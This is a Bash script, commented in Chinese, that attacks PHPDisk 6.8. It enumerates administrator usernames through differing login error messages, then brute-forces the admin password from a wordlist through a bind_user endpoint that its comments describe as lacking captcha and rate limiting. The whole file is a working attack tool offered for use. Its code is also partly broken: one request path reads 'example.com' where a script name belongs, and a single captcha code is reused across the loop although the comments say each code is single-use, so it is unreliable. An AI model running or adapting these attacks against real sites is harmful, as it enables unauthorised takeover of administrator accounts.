#!/usr/bin/env bash
# PHPDisk 6.8 adminlogin 账号存在性枚举 + bind_user 口令校验
# 用法: ./phpdisk_enum.sh http://TARGET
BASE="${1:-http://TARGET}"
CK=$(mktemp)

# ---- 1) adminlogin 账号存在性枚举（验证码正确时才有判定价值）----
# 先取 session + 验证码图，人工/OCR 识别出明文 CODE
curl -s -c "$CK" -o /dev/null "$BASE/account.php?action=adminlogin"
curl -s -b "$CK" -c "$CK" -o ./code.png "$BASE/includes/imgcode.inc.php?verycode_type=2"
echo "[*] 请识别 ./code.png 中的 4 位验证码，填入 CODE"
read -p "CODE=" CODE

for u in admin admincp administrator root superadmin webmaster manager; do
  R=$(curl -s -b "$CK" -X POST "$BASE/account.php?action=adminlogin" \
      -d "formhash=HASH&task=adminlogin&username=$u&password=x&verycode=$CODE")
  if   echo "$R" | grep -q '不是合法的后台管理员'; then echo "[+] $u 存在（gid≠1）"
  elif echo "$R" | grep -q '该用户名未注册';       then echo "[-] $u 不存在"
  fi
  # 验证码一次性消耗，每轮需重新取图识别
done

# ---- 2) bind_user 口令校验（无验证码、无频控，最佳爆破通道）----
# 正确 -> "true|社会化登录成功" + Set-Cookie phpdisk_zcore_v2_info
# 错误 -> "用户名或密码不正确"
while read -r PW; do
  R=$(curl -s -X POST "$BASE/example.com?action=bind_user" \
      -d "flid=probe$RANDOM&username=admin&password=$PW")
  [ "$R" != '用户名或密码不正确' ] && { echo "[HIT] admin / $PW => $R"; break; }
  sleep 1.5
done < wordlist.txt
